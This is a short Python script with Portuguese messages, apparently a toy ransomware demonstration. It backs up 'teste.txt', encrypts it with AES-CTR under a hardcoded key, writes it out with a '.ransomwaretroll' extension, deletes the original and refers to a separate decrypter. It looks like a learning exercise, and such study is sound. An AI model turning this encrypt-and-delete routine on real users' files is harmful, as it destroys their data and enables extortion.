import os
import pyaes

file_name = "teste.txt"
chave = b"testeransomwares"

with open(file_name, "rb") as f:
    dados_arquivo = f.read()

with open(file_name + ".backup", "wb") as f:
    f.write(dados_arquivo)
print("Backup criado: teste.txt.backup")

aes = pyaes.AESModeOfOperationCTR(chave)
dados_criptografados = aes.encrypt(dados_arquivo)

arquivo_novo = file_name + ".ransomwaretroll"
with open(arquivo_novo, "wb") as f:
    f.write(dados_criptografados)

os.remove(file_name)

print(f"Arquivo criptografado: {arquivo_novo}")
print("Execute o decrypter.py para recuperar")